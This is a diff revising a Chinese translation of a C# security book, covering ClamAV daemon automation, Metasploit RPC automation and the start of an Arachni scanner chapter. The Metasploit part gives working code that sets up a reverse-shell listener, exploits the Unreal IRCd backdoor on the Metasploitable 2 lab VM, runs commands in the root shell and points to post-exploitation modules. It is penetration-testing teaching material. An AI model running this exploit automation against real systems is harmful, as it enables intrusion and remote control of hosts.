+连接到 `clam` 并发送 `VERSION` 命令应该打印出 ClamAV 版本。你也可以发送带有文件路径参数的 `SCAN` 命令，它应该返回扫描结果。编写代码来自动化这一点很容易。
 
 # 为 clam 创建会话类
 
-ClamdSession 类的工作原理几乎不需要深入研究代码，因为它非常简单。我们创建了一些属性来存储 clam 运行的主机，以及一个 Execute() 方法，该方法接收一个 TcpClient 类以创建一个新的 TCP 流来写入命令，如列表 10-16 所示。TcpClient 类在第 4 章构建自定义有效负载时首次引入。我们在第 7 章自动化 OpenVAS 漏洞扫描器时也使用了它。
+`ClamdSession` 类的工作原理几乎不需要深入研究代码，因为它非常简单。我们创建了一些属性来存储 `clam` 运行的主机，以及一个 `Execute()` 方法，该方法接收一个 `TcpClient` 类以创建一个新的 TCP 流来写入命令，如列表 10-16 所示。`TcpClient` 类在第 4 章构建自定义有效负载时首次引入。我们在第 7 章自动化 OpenVAS 漏洞扫描器时也使用了它。
+
+
 
 ```csharp
 public class ClamdSession{
@@ -6501,15 +6583,15 @@ public class ClamdSession{
 }
 ```
 
-列表 10-16: 创建新 clamd 会话的类
+列表 10-16：创建新 `clamd` 会话的类
 
-ClamdSession 构造函数 ① 接收两个参数——主机和连接端口，然后将它们赋值给本地类变量，供 Execute() 方法使用。过去，我们所有的会话类都实现了 IDisposable 接口，但我们在 ClamdSession 类中实际上不需要这样做。完成后我们不需要清理任何内容，因为 clamd 是一个运行在端口上的守护进程，是一个可以持续运行的后台进程，这为我们减少了一些复杂性。
+`ClamdSession` 构造函数 ① 接收两个参数——主机和连接端口，然后将它们赋值给本地类变量，供 `Execute()` 方法使用。过去，我们所有的会话类都实现了 `IDisposable` 接口，但我们在 `ClamdSession` 类中实际上不需要这样做。完成后我们不需要清理任何内容，因为 `clamd` 是一个运行在端口上的守护进程，是一个可以持续运行的后台进程，这为我们减少了一些复杂性。
 
-Execute() 方法 ② 接收一个参数：要在 clamd 实例上运行的命令。我们的 ClamdManager 类将仅实现所有可用 clamd 命令中的几个，因此你会发现 clamd 协议命令非常有用，可以查看还有哪些强大的命令可以用于自动化。为了运行命令并开始读取 clamd 响应，我们首先创建一个新的 TcpClient 类 ③，它使用主机并将端口传递给构造函数，作为我们可以对其写入命令的 clamd 实例。使用 Write() 方法 ④ 我们将命令写入流，然后创建一个新的 StreamReader 类来读取响应 ⑤。最后，我们返回响应 ⑥。
+`Execute()` 方法 ② 接收一个参数：要在 `clamd` 实例上运行的命令。我们的 `ClamdManager` 类将仅实现所有可用 `clamd` 命令中的几个，因此你会发现 `clamd` 协议命令非常有用，可以查看还有哪些强大的命令可以用于自动化。为了运行命令并开始读取 `clamd` 响应，我们首先创建一个新的 `TcpClient` 类 ③，它使用主机并将端口传递给构造函数，作为我们可以对其写入命令的 `clamd` 实例。使用 `Write()` 方法 ④ 我们将命令写入流，然后创建一个新的 `StreamReader` 类来读取响应 ⑤。最后，我们返回响应 ⑥。
 
-# 创建 clam 的 Manager 类
+# 创建 `clamd` 的 Manager 类
 
-ClamdSession 类（我们在 10-17 中定义）的简单性使得 ClamdManager 类也非常简单。它包含构造函数和两个方法来执行我们在 10-15 中手动执行的命令。
+`ClamdSession` 类（我们在 10-17 中定义）的简单性使得 `ClamdManager` 类也非常简单。它包含构造函数和两个方法来执行我们在 10-15 中手动执行的命令。
 
 ```csharp
 public class ClamdManager
@@ -6533,13 +6615,13 @@ public class ClamdManager
 }
 ```
 
-列表 10-17: clamd 的管理器类
+列表 10-17：`clamd` 的管理器类
 
-ClamdManager 构造函数 ❶ 接收一个参数——要执行的会话——并将其赋值给本地变量 _session，供其他方法使用。我们创建的第一个方法是 GetVersion() ❷，它执行命令并返回版本信息。第二个方法 Scan() ❸ 获取文件路径作为参数并将其传递给 clamd 实例。现在我们有了会话管理器类，可以将它们整合在一起。
+`ClamdManager` 构造函数 ❶ 接收一个参数——要执行的会话——并将其赋值给本地变量 `_session`，供其他方法使用。我们创建的第一个方法是 `GetVersion()` ❷，它执行命令并返回版本信息。第二个方法 `Scan()` ❸ 获取文件路径作为参数并将其传递给 `clamd` 实例。现在我们有了会话管理器类，可以将它们整合在一起。
 
-# 使用 clamd 测试
+# 使用 `clamd` 测试
 
-将所有内容整合在一起在 Main() 方法中只需要几行代码，如列表 10-18 所示。
+将所有内容整合在一起在 `Main()` 方法中只需要几行代码，如列表 10-18 所示。
 
 ```csharp
 public static void Main(string[] args)
@@ -6555,53 +6637,50 @@ public static void Main(string[] args)
 }
 ```
 
-列表 10-18: Main() 方法
+列表 10-18：`Main()` 方法
 
 ## 总结
 
-ClamAV 是一种适用于家庭和办公室的强大且灵活的反病毒软件。我们以两种不同的方式驱动 ClamAV。在本章中，我们为原生 libclamav 库实现了一些小型绑定。这允许我们随心地分配、扫描和释放 ClamAV 引擎，但代价是每次运行程序时都需要携带 libclamav 的副本。然后，我们实现了两个类，允许我们驱动远程 clam 实例以检索 ClamAV 版本信息并扫描 clamd 服务器上的给定文件路径。这有效地提升了我们的程序速度，但代价是需要
-
-
-待扫描的文件应位于运行 `clam` 的服务器上。
+ClamAV 是一种适用于家庭和办公室的强大且灵活的反病毒软件。我们以两种不同的方式驱动 ClamAV。在本章中，我们为原生 `libclamav` 库实现了一些小型绑定。这允许我们随心地分配、扫描和释放 ClamAV 引擎，但代价是每次运行程序时都需要携带 `libclamav` 的副本。然后，我们实现了两个类，允许我们驱动远程 `clamd` 实例以检索 ClamAV 版本信息并扫描 `clamd` 服务器上的给定文件路径。这有效地提升了我们的程序速度，但代价是需要待扫描的文件应位于运行 `clam` 的服务器上。
 
 ClamAV 项目是一个大公司（思科）真正支持造福大家的开源软件绝佳案例。你会发现，扩展这些绑定以更好地保护和防御你的应用程序、用户和网络是一项极佳的练习。
 
-# 11
-自动化 METASPLOIT
+# 11 自动化 Metasploit
 
 ![](img/059a0f6a8101e80261ab133380da85bd_233_0.png)
 
 Metasploit 是事实上的标准开源渗透测试框架。Metasploit 用 Ruby 编写，既是一个漏洞数据库，也是一个用于漏洞利用开发和渗透测试的框架。但 Metasploit 许多最强大的功能（例如其远程过程调用（RPC）API）往往被忽视。
 
-本章将向你介绍 Metasploit RPC，并展示如何使用它程序化地驱动 Metasploit 框架。你将学习如何使用 RPC 自动化 Metasploit 来利用 Metasploitable 2，这是一个为了学习如何使用 Metasploit 而故意留漏洞的 Linux 虚拟机。红队或进攻安全专业人员应该注意，许多繁琐的工作是可以自动化的，从而释放时间来关注更复杂或非显而易见的漏洞。通过这种 API 驱动的 Metasploit 框架，你将能够以可扩展的方式自动化主机发现甚至网络渗透等繁琐任务。
+本章将向你介绍 Metasploit RPC，并展示如何使用它程序化地驱动 Metasploit 框架。你将学习如何使用 RPC 自动化 Metasploit 来利用 Metasploitable 2，这是一个为了学习如何使用 Metasploit 而故意留漏洞的 Linux 虚拟机。红队或进攻安全专业人员应该注意，许多繁琐的工作是可以自动化的，从而释放时间来关注更复杂或非显而易见的漏洞。通过这个 API 驱动的 Metasploit 框架，你将能够以可扩展的方式自动化主机发现甚至网络渗透等繁琐任务。
 
 ## 运行 RPC 服务器
 
 由于我们在第 4 章中已经设置了 Metasploit，我在这里不再重复介绍如何设置它。列表 11-1 显示了运行 RPC 服务器需要输入的内容。
 
-```
+```bash
 $ msfrpc -U username -P password -S f
-Listing 11-1: 运行 RPC 服务器
 ```
+
+列表 11-1：运行 RPC 服务器
 
 `-U` 和 `-P` 参数代表用于 RPC 验证的用户名和密码。你可以使用任何你想要的用户名或密码，因为我们在编写 C# 代码时会用到这些凭据。`-s` 参数禁用 SSL。（自签名证书会使事情变得复杂一些，我们现在先忽略它们。）最后，`-f` 告诉 RPC 接口在正台（fore-ground）中运行，以便更容易监控 RPC 进程。
 
-要使用正在运行的 RPC 接口，请启动一个新的终端，或者在不带 `-f` 选项（该选项会让 msfrpc 在后台运行）的情况下重新启动 msfrpc，然后使用 Metasploit 的 msfrpc 客户端连接到刚刚启动的 RPC 监听器并发出调用。预警一下：`msfrpc` 客户端相当晦涩——它难以阅读且错误信息不直观。列表 11-2 显示了使用 Metasploit 中的 `msfrpc` 客户端与 `msfrpc` 服务器进行验证的过程。
+要使用正在运行的 RPC 接口，请启动一个新的终端，或者在不带 `-f` 选项（该选项会让 `msfrpc` 在后台运行）的情况下重新启动 `msfrpc`，然后使用 Metasploit 的 `msfrpc` 客户端连接到刚刚启动的 RPC 监听器并发出调用。预警一下：`msfrpc` 客户端相当晦涩——它难以阅读且错误信息不直观。列表 11-2 显示了使用 Metasploit 中的 `msfrpc` 客户端与 `msfrpc` 服务器进行验证的过程。
 
-```
+```bash
 $ msfrpc -U username -P password -S -a 127.0.0.1
 [*] The 'rpc' object holds the RPC interface
 [*] Use rpc.call('group, 'command') to make RPC calls
 ```
 
-```
+```text
 >> Rpc.call('login','username','password')
 => {"result":"success","token":"TEMPFZY3CFXwqBn9jfofOehbKxb"}
 ```
 
-列表 11-2：使用 msfrpc 客户端向 msfrpc 服务器进行身份验证
+列表 11-2：使用 `msfrpc` 客户端向 `msfrpc` 服务器进行身份验证
 
-要使用 msfrpc 连接到 RPC 监听器，我们向 `msfrpc` 传递几个参数。用户名和密码分别通过 `-U` ① 和 `-P` ② 设置。`-s` 参数 ③ 告诉 `msfrpc` 在连接到监听器时不使用 SSL，`-a` 参数 ④ 是监听器连接的 IP 地址。由于我们在启动 `msfrpc` 实例时没有指定监听的 IP 地址，因此使用了默认地址 `127.0.0.1`。
+要使用 `msfrpc` 连接到 RPC 监听器，我们向 `msfrpc` 传递几个参数。用户名和密码分别通过 `-U` ① 和 `-P` ② 设置。`-s` 参数 ③ 告诉 `msfrpc` 在连接到监听器时不使用 SSL，`-a` 参数 ④ 是监听器连接的 IP 地址。由于我们在启动 `msfrpc` 实例时没有指定监听的 IP 地址，因此使用了默认地址 `127.0.0.1`。
 
 一旦连接到 RPC 监听器，我们就可以 `rpc.call()` ⑤ 调用所有可用的 API 方法。我们将测试 `authlogin` 过程方法，因为它将使用与参数传递的相同的用户名和密码。当你调用 `rpc.call()` 时，RPC 方法和参数会被封装成一个序列化的 MSGPACK 块，并通过 HTTP POST 请求发送到 RPC 服务器，其内容类型类型为 `binary/message-pack`。这些是需要注意的重要点，因为我们需要在 C 中执行相同的事情来与 RPC 服务器通信。
 
@@ -6609,13 +6688,13 @@ $ msfrpc -U username -P password -S -a 127.0.0.1
 
 # 安装 Metasploitable
 
-Metasploitable 2 有一个特别容易利用的特定漏洞：一个带有后门的 Unreal IRC 服务器。这是一个带有 Metasploit 模块的漏洞绝佳案例，可以通过它来练习 Metasploit RPC。你可以从 Rapid7 (https://information.rapid7.com/metasploitable-download.html) 或 VulnHub (https://www.vulnhub.com) 下载 Metasploitable 2。
+Metasploitable 2 有一个特别容易利用的特定漏洞：一个带有后门的 Unreal IRC 服务器。这是一个带有 Metasploit 模块的漏洞绝佳案例，可以通过它来练习 Metasploit RPC。你可以从 Rapid7（https://information.rapid7.com/metasploitable-download.html）或 VulnHub（https://www.vulnhub.com）下载 Metasploitable 2。
 
-Metasploitable 以 VMDK 镜像的形式包含 ZIP 包中，因此将其安装到 VirtualBox 中并不简单。在 VirtualBox 中解压后，请按照以下说明操作：
+Metasploitable 以 VMDK 镜像的形式包含在 ZIP 包中，因此将其安装到 VirtualBox 中并不简单。在 VirtualBox 中解压后，请按照以下说明操作：
 
 1. 点击左上角的“新建”按钮。
 2. 创建一个名为 Metasploitable 的虚拟机。
-3. 将类型设为 Linux，版本为 Ubuntu (64位)。
+3. 将类型设为 Linux，版本为 Ubuntu（64 位）。
 4. 分配 512 MB 内存和 1 GB 硬盘。
 5. 在硬盘对话框中，选择“使用现有虚拟硬盘”。
 6. 导航到解压 Metasploitable 的文件夹。
@@ -6627,24 +6706,20 @@ Metasploitable 以 VMDK 镜像的形式包含 ZIP 包中，因此将其安装到
 
 # 获取 MSGPACK 库
 
-在使用 C# 驱动 Metasploit 实例之前，我们还需要一个东西。该库不是 C# 核心库的一部分，因此我们需要使用 NuGet（类似于 Python 的 pip 或 Ruby 的 gem 的包管理器）来安装正确的库。默认情况下，Visual Studio 和 Xamarin Studio 拥有强大的 NuGet 包管理。然而，适用于 Linux 发行版的免费 MonoDevelop 在 NuGet 功能方面没有其他 IDE 更新快。让我们来看看如何在 MonoDevelop 中安装正确的 MSGPACK 库。这有点麻烦，但使用 Xamarin Studio 和 Visual Studio 会简单得多，因为它们不需要使用特定版本的 MSGPACK 库。
+在使用 C# 驱动 Metasploit 实例之前，我们还需要一个东西。该库不是 C# 核心库的一部分，因此我们需要使用 NuGet（类似于 Python 的 `pip` 或 Ruby 的 `gem` 的包管理器）来安装正确的库。默认情况下，Visual Studio 和 Xamarin Studio 拥有强大的 NuGet 包管理。然而，适用于 Linux 发行版的免费 MonoDevelop 在 NuGet 功能方面没有其他 IDE 更新快。让我们来看看如何在 MonoDevelop 中安装正确的 MSGPACK 库。这有点麻烦，但使用 Xamarin Studio 和 Visual Studio 会简单得多，因为它们不需要使用特定版本的 MSGPACK 库。
 
 # 为 MonoDevelop 安装 NuGet 包管理器
 
 首先，你可能需要使用 MonoDevelop 插件安装 NuGet。如果是这样，请打开 MonoDevelop，然后按照以下步骤安装 NuGet 包管理器：
 
-- 进入“工具 ➔ 插件管理器 (Add-in Manager)”菜单项。
-- 点击“库 (Gallery)”选项卡。
-- 在“仓库”下拉列表中选择“管理仓库 (Manage Repositories)”。
+- 进入“工具 ➔ 插件管理器（Add-in Manager）”菜单项。
+- 点击“库（Gallery）”选项卡。
+- 在“仓库”下拉列表中选择“管理仓库（Manage Repositories）”。
 - 点击“添加”按钮添加新仓库。
 - 在“新仓库”对话框中，确保选中了“注册在线仓库”。在 URL 文本框中输入以下 URL：`http://mrward.github.com/monodevelop-nuget-addin-repository/4.0/main.mrep`
 - 点击“确定”，然后点击“关闭”新仓库对话框。
 
 安装新仓库后，你可以轻松地安装 NuGet 包管理器。关闭仓库对话框后，你应该回到插件管理器的“库”选项卡。有一个用于搜索可安装插件的文本框。在此框中输入 `nuget`；它应该过滤包以显示 NuGet 包管理器。选择 NuGet 扩展，然后点击“安装”按钮（见图 11-1）。
-
-
-
-
 
 ![](img/059a0f6a8101e80261ab133380da85bd_237_0.png)
 
@@ -6663,7 +6738,7 @@ Metasploitable 以 VMDK 镜像的形式包含 ZIP 包中，因此将其安装到
 
 ## 引用 MSPACK 库
 
-在安装了正确版本的 MSPACK 库后，我们现在可以将其作为引用添加到项目中，以便我们可以开始编写代码。通常 NuGet 会处理这些，但这是 MonoDevelop 的一个小 bug，我们必须规避它。在 MonoDevelop 解决方案面板中右键点击“引用”文件夹，选择“编辑引用...”（见图 11-2）。
+在安装了正确版本的 MSPACK 库后，我们现在可以将其作为引用添加到项目中，以便我们可以开始编写代码。通常 NuGet 会处理这些，但这是 MonoDevelop 的一个小 bug，我们必须规避它。在 MonoDevelop 解决方案面板中右键点击“引用”文件夹，选择“编辑引用...” （见图 11-2）。
 
 ![](img/059a0f6a8101e80261ab133380da85bd_238_0.png)
 
@@ -6677,9 +6752,13 @@ Metasploitable 以 VMDK 镜像的形式包含 ZIP 包中，因此将其安装到
 
 找到 `MsgPack.dll` 库后，选择它并点击对话框右角的确定。这将 `MsgPack.dll` 库添加到你的项目中，这样你就可以在 C# 源文件中开始使用这些类并引用该库。
 
-## 编写 MetasploitSession 类
+## 编写 `MetasploitSession` 类
 
-现在我们需要构建一个 MetasploitSession 类与 RPC 服务器通信，如列表 11-4 所示。
+现在我们需要构建一个 `MetasploitSession` 类与 RPC 服务器通信，如列表 11-4 所示。
+
+
+
+## MetasploitSession 类
 
 ```csharp
 public class MetasploitSession : IDisposable
@@ -6713,11 +6792,11 @@ public class MetasploitSession : IDisposable
     }
 ```
 
-> 列表 11-4：MetasploitSession 构造函数接受三个参数，如 ➀ 所示，用于与主机连接身份验证的用户名和密码。我们使用提供的用户名和密码调用 Authenticate() ➁，并通过检查响应是否包含错误来测试身份验证。❸ 如果身份验证失败，将抛出异常 ⒋。如果验证成功，我们将 RPC ⑤ 返回的 token 值赋值给 `_token` 变量，并将 Token ⑥ 设为公开。Authenticate() 方法调用 Execute() 方法 ⑦，将 `auth.login` 作为 RPC 方法连同用户名和密码传入。
+> 列表 11-4：`MetasploitSession` 构造函数接受三个参数，如 ➀ 所示，用于与主机连接身份验证的用户名和密码。我们使用提供的用户名和密码调用 `Authenticate()` ➁，并通过检查响应是否包含错误来测试身份验证。❸ 如果身份验证失败，将抛出异常 ⒋。如果验证成功，我们将 RPC ⑤ 返回的 token 值赋值给 `_token` 变量，并将 `Token` ⑥ 设为公开。`Authenticate()` 方法调用 `Execute()` 方法 ⑦，将 `auth.login` 作为 RPC 方法连同用户名和密码传入。
 
 ## 创建用于与 MSGPACK 交互的 HTTP 请求的 Execute() 方法
 
-列表 11-5 所示的 Execute() 方法完成了 RPC 库的大部分工作，创建并发送 HTTP 请求，并将 RPC 方法和参数序列化为 MSGPACK。
+列表 11-5 所示的 `Execute()` 方法完成了 RPC 库的大部分工作，创建并发送 HTTP 请求，并将 RPC 方法和参数序列化为 MSGPACK。
 
 ```csharp
 public Dictionary<object, object> Execute(string method, object[] args)
@@ -6763,7 +6842,7 @@ public Dictionary<object, object> Execute(string method, object[] args)
 }
 ```
 
-> 列表 11-5：MetasploitSession 的 Execute() 方法。在处检查 auth.login 是否是唯一不需要身份验证的方法。如果方法不是 auth.login 且没有身份验证，我们将抛出异常，因为传递的命令将失败。
+> 列表 11-5：`MetasploitSession` 的 `Execute()` 方法。在处检查 `auth.login` 是否是唯一不需要身份验证的方法。如果方法不是 `auth.login` 且没有身份验证，我们将抛出异常，因为传递的命令将失败。
 
 ## 转换来自 MSGPACK 的响应数据
 
@@ -6771,12 +6850,7 @@ public Dictionary<object, object> Execute(string method, object[] args)
 
 ## 使用 MessagePackToDictionary() 将 MSGPACK 对象转换为 C# 字典
 
-列表 11-6 所示的 MessagePackToDictionary() 方法是在此处引入的
-
-
-
-
-Execute() 方法中 Listing 11-5 的结束。它接受一个 `MessagePackObjectDictionary` 并将其转换为 C# 字典（一种用于键值对的类），这与 Ruby 或 Python 的 hash 非常相似。
+列表 11-6 所示的 `MessagePackToDictionary()` 方法是在此处引入的 `Execute()` 方法中 Listing 11-5 的结束。它接受一个 `MessagePackObjectDictionary` 并将其转换为 C# 字典（一种用于键值对的类），这与 Ruby 或 Python 的 hash 非常相似。
 
 ```
 Dictionary<object, object> object = MessagePackToDictionary(MessagePackObjectDictionary dict)
@@ -6792,9 +6866,7 @@ foreach (var pair in dict)
 return newDict;
 ```
 
-Listing 11-6：MessagePackToDictionary 方法接收单个参数 ①，
-
-我们想要转换为 C# 字典的 MessagePackToDictionary 方法。一旦我们创建了 C# 字典 ②，我们就可以通过遍历作为方法参数 ③ 传递的 MSGPACK 字典中的每个键值对，将转换后的 MSGPACK 对象放入其中。首先，我们为当前循环迭代的键获取一个 C# 对象 ④，然后测试对应的值以确定如何处理它。例如，如果该值是一个字典，我们通过调用 `MessagePackToDictionary()` 向方法引入递归。否则，如果该值不是另一个字典，我们使用 `GetObject()`（我们稍后会定义它 ⑤）将其转换为对应的 C# 类型。最后，我们返回带有 C# 类型而非 MSGPACK 类型的新字典 ⑥。
+Listing 11-6：`MessagePackToDictionary` 方法接收单个参数 ①，我们想要转换为 C# 字典的 `MessagePackToDictionary` 方法。一旦我们创建了 C# 字典 ②，我们就可以通过遍历作为方法参数 ③ 传递的 MSGPACK 字典中的每个键值对，将转换后的 MSGPACK 对象放入其中。首先，我们为当前循环迭代的键获取一个 C# 对象 ④，然后测试对应的值以确定如何处理它。例如，如果该值是一个字典，我们通过调用 `MessagePackToDictionary()` 向方法引入递归。否则，如果该值不是另一个字典，我们使用 `GetObject()`（我们稍后会定义它 ⑤）将其转换为对应的 C# 类型。最后，我们返回带有 C# 类型而非 MSGPACK 类型的新字典 ⑥。
 
 ## 使用 GetObject() 将 MSGPACK 对象转换为 C# 对象
 
@@ -6815,7 +6887,7 @@ private object GetObject(MessagePackObject str)
 }
 ```
 
-Listing 11-7：MetasploitSession 类的 GetObject() 方法
+Listing 11-7：`MetasploitSession` 类的 `GetObject()` 方法
 
 `GetObject()` 方法检查对象是否为特定类型之一（如字符串或布尔值），如果找到匹配项，则将该对象作为 C# 类型返回。在 ① 处，我们将任何 `UnderlyingType` 为字节数组的 `MessagePackObject` 转换为字符串并返回新字符串。由于从 Metasploit 发出的“字符串”实际上只是数组，我们必须在开始将这些字节数组转换为字符串，否则每次想使用它们时都需要将其强制转换为字符串。强制转换通常在计算上效率很低，因此最好一次性转换所有值。
 
@@ -6825,7 +6897,7 @@ Listing 11-7：MetasploitSession 类的 GetObject() 方法
 
 Listing 11-8 所示的 `Dispose()` 方法在垃圾回收期间清理我们的 RPC 会话。
 
-```sharp
+```csharp
 public void Dispose()
 {
     if (this.Token != null)
@@ -6836,7 +6908,7 @@ public void Dispose()
 }
 ```
 
-Listing 11-8：MetasploitSession 类的 Dispose() 方法
+Listing 11-8：`MetasploitSession` 类的 `Dispose()` 方法
 
 如果我们的 `Token` 属性不空，我们假设已经通过验证，调用 logout 并将其作为参数，并将 `_token` 设置为 `null`。
 
@@ -6862,7 +6934,7 @@ using (MetasploitSession session = new MetasploitSession("username",
 }
 ```
 
-Listing 11-9：使用 MetasploitSession 类从 RPC 获取版本
+Listing 11-9：使用 `MetasploitSession` 类从 RPC 获取版本
 
 ## 编写 MetasploManager 类
 
@@ -6910,15 +6982,13 @@ public class MetasploManager : IDisposable
 }
 ```
 
-
-
-当会话连接时，监听器将停止。如果此值为 true，监听器将停止；如果为 false，监听器将继续监听新的 shell。PAYLOAD 选项是一个字符串，告诉 Metasploit 应该期望哪种类型的回连载荷（connect-back payload）。LPORT 和 LHOST 分别是要监听的端口和 IP 地址。我们使用 `ExecuteModule()` 将这些选项传递给 `multi/handler` 漏洞模块（该模块负责监听来自 Metasploitable 的回连 shell），该函数会启动一个监听回连 shell 的任务。`ExecuteModule()` 返回任务 ID 并将其存储起来以供稍后使用。
+当会话连接时，监听器将停止。如果此值为 true，监听器将停止；如果为 false，监听器将继续监听新的 shell。`PAYLOAD` 选项是一个字符串，告诉 Metasploit 应该期望哪种类型的回连载荷（connect-back payload）。`LPORT` 和 `LHOST` 分别是要监听的端口和 IP 地址。我们使用 `ExecuteModule()` 将这些选项传递给 `multi/handler` 漏洞模块（该模块负责监听来自 Metasploitable 的回连 shell），该函数会启动一个监听回连 shell 的任务。`ExecuteModule()` 返回任务 ID 并将其存储起来以供稍后使用。
 
 # 运行漏洞
 
 列表 11-13 显示了如何编写代码针对 Metasploitable 运行实际漏洞。
 
-```sharp
+```csharp
 opts = new Dictionary<object, object>();
 opts["RHOST"] = args[0];
 opts["DisablePayloadHandler"] = true;
@@ -6927,7 +6997,7 @@ opts["LPORT"] = listenPort;
 opts["PAYLOAD"] = payload;
 ```
 
-manager=ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts); // 列表 11-13 通过 RPC 运行 Unreal IRCD 循环
+`manager=ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);` // 列表 11-13 通过 RPC 运行 Unreal IRCD 循环
 
 正如我们之前所做的，我们在调用 `ExecuteModule()` 之前在字典中设置模块数据存储选项，并将其传递给 `unix/irc/unreal_ircd_3281_backdoor` 漏洞模块名称和选项（见列表 11-14）。
 
@@ -6940,13 +7010,15 @@ while (response.ContainsValue("Exploit:unix/irc/unreal_ircd_3281_backdoor")) {
 }
 ```
 
-response=manager.StopJob(jobID.ToString()); // 列表 11-14：等待 Unreal IRCD 漏洞完成
+`response=manager.StopJob(jobID.ToString());` // 列表 11-14：等待 Unreal IRCD 漏洞完成
 
-`ListJobs` 方法返回当前 Metasploit 实例上运行的所有任务的列表，格式为包含模块名称的字符串列表。如果列表包含我们正在运行的模块名称，说明我们的漏洞尚未完成，因此我们需要等待一会儿并重新检查，直到我们的模块不再出现在列表中。如果 `ContainsValue()` 返回 true，则我们的模块仍在运行，于是我们休眠并再次调用 `ListJobs()`，直到漏洞模块不再出现在任务列表中，这意味着它已经运行完毕。最后，我们通过传递之前存储的任务 ID，使用 `StopJob()` 关闭 `multi/handler` 漏洞模块。
 
-# 与 shell 交互
 
-现在我们应该能够与新的 shell 进行交互了。为了测试连接，我们运行一个简单的命令来确认我们已经获得了所需的访问，如列表 11-15所示。
+`ListJobs` 方法返回当前 Metasploit 实例上运行的所有任务的列表，格式为包含模块名称的字符串列表。如果列表包含我们正在运行的模块名称，说明我们的漏洞尚未完成，因此我们需要等待一会儿并重新检查，直到我们的模块不再出现在列表中。如果 `ContainsValue()` 返回 `true`，则我们的模块仍在运行，于是我们休眠并再次调用 `ListJobs()`，直到漏洞模块不再出现在任务列表中，这意味着它已经运行完毕。最后，我们通过传递之前存储的任务 ID，使用 `StopJob()` 关闭 `multi/handler` 漏洞模块。
+
+## 与 shell 交互
+
+现在我们应该能够与新的 shell 进行交互了。为了测试连接，我们运行一个简单的命令来确认我们已经获得了所需的访问，如列表 11-15 所示。
 
 ```csharp
 response = manager.ListSessions();
@@ -6966,9 +7038,9 @@ foreach (var pair in response)
 
 我们调用 `ListSessions()`，它返回会话 ID 列表以及会话的通用信息（如会话类型）。当我们遍历每个会话时（除非你运行了多次漏洞，否则应该只有一个），我们使用 `WriteToSession()` 方法向会话 shell 写入 `id` 命令，休眠一会儿，然后使用 `ReadSessionShell()` 读取响应。最后，我们将会在被攻击系统上运行 `id` 的结果写入，然后使用 `StopSession()` 杀死会话。
 
-# 弹出 shell
+## 弹出 shell
 
-我们现在可以运行自动化并弹出一些简单的 shell。如列表 11-16所示，程序必须带有两个参数运行：要利用的主机以及 Metasploit 应该监听 shell 的 IP 地址。
+我们现在可以运行自动化并弹出一些简单的 shell。如列表 11-16 所示，程序必须带有两个参数运行：要利用的主机以及 Metasploit 应该监听 shell 的 IP 地址。
 
 ```bash
 $ /c11_automating_metasploit.exe 192.168.0.18 192.168.0.2
@@ -6987,16 +7059,13 @@ $
 
 如果一切运行正常，我们现在应该拥有一个 root shell 1，并且可以使用 C# 自动化针对 Metasploitable 运行一些后利用模块，或者在其中一个 shell 失线时仅弹出一个备用 shell。`post/linux/gather/enum_configs` 模块是 Linux 常用的后利用模块。你可以更新自动化脚本，在弹出 Metasploitable 上的初始 shell 后运行此模块或任何 `post/linux/gather/enum-*` 模块。
 
-这是你可以驱动 Metasploit Framework 实现的非常酷的功能的开始，从发现到漏洞利用。正如之前提到的，Metasploit 在后利用领域也有席之地，拥有许多针对多种操作系统的模块。你也可以使用 `auxiliary/scanner/*` 中的扫描模块驱动发现。一个有趣的练习是利用我们在第4章编写的跨平台 Metasploit 载荷，通过 RPC 动态生成 shellcode 并创建动态载荷。
+这是你可以驱动 Metasploit Framework 实现的非常酷的功能的开始，从发现到漏洞利用。正如之前提到的，Metasploit 在后利用领域也有席之地，拥有许多针对多种操作系统的模块。你也可以使用 `auxiliary/scanner/*` 中的扫描模块驱动发现。一个有趣的练习是利用我们在第 4 章编写的跨平台 Metasploit 载荷，通过 RPC 动态生成 shellcode 并创建动态载荷。
 
 ## 总结
 
 在本章中，你学习了如何使用 C# 和 RPC 自动化 Metasploit。我们涵盖了如何运行漏洞、与生成的 shell 交互以及自动弹出多个 shell。我们还触及了后利用以及如何将这些工具集成到更大的工作流中。这是安全测试和渗透测试的一种强大技术。
 
-
-
-
-通过 REST API，你可以使用任何常用的 HTTP 实用（如 `curl` 或 `netcat`）开始简单的扫描。在本书中，我们将像前面的章节一样使用 `curl`。我们的第一次扫描如列表 12-3所示。
+通过 REST API，你可以使用任何常用的 HTTP 实用（如 `curl` 或 `netcat`）开始简单的扫描。在本书中，我们将像前面的章节一样使用 `curl`。我们的第一次扫描如列表 12-3 所示。
 
 ```bash
 $ curl -X POST -data "url=http://demo.testfire.net/default.aspx" http://127.0.0.1:7331/scans \
@@ -7013,7 +7082,7 @@ $ curl http://127.0.0.1:7331/scans --data "status=busy,fail=676fc9d9eddc44b8a321
 
 ## 创建 ArachniHTTPSession 类
 
-与之前的章节一样，我们将实现一个会话类（session class）和一个管理器类来与 Arachni API 交互。目前，这些类相对简单，但将它们分离出来可以为未来屏蔽 API 认证或额外步骤提供更大的灵活性。列表 12-4 详细列出了 ArachniHTTPSession 类。
+与之前的章节一样，我们将实现一个会话类（session class）和一个管理器类来与 Arachni API 交互。目前，这些类相对简单，但将它们分离出来可以为未来屏蔽 API 认证或额外步骤提供更大的灵活性。列表 12-4 详细列出了 `ArachniHTTPSession` 类。
 
 ```csharp
 public class ArachniHTTPSession {
@@ -7049,13 +7118,13 @@ public class ArachniHTTPSession {
 }
 ```
 
-列表 12-4: ArachniHTTPSession 类
+列表 12-4: `ArachniHTTPSession` 类
 
-在本书的目前阶段，ArachniHTTPSession 类应该相当容易理解，因此我们不会深入研究代码。我们创建了一个构造函数 ➀，它接受两个参数——要连接的主机和端口——并将值分配给相应的属性。然后，我们创建了一个方法，根据传递给该方法的参数执行通用的 HTTP 请求 ②。`ExecuteRequest()` 方法应该返回一个 `JObject`，其中包含由给定 API 端点返回的任何数据。由于 `ExecuteRequest()` 方法可以用于对 Arachni 执行任何 API 调用，我们唯一可以预期的是响应将是 JSON，可以从服务器响应解析为对象。
+在本书的目前阶段，`ArachniHTTPSession` 类应该相当容易理解，因此我们不会深入研究代码。我们创建了一个构造函数 ➀，它接受两个参数——要连接的主机和端口——并将值分配给相应的属性。然后，我们创建了一个方法，根据传递给该方法的参数执行通用的 HTTP 请求 ②。`ExecuteRequest()` 方法应该返回一个 `JObject`，其中包含由给定 API 端点返回的任何数据。由于 `ExecuteRequest()` 方法可以用于对 Arachni 执行任何 API 调用，我们唯一可以预期的是响应将是 JSON，可以从服务器响应解析为对象。
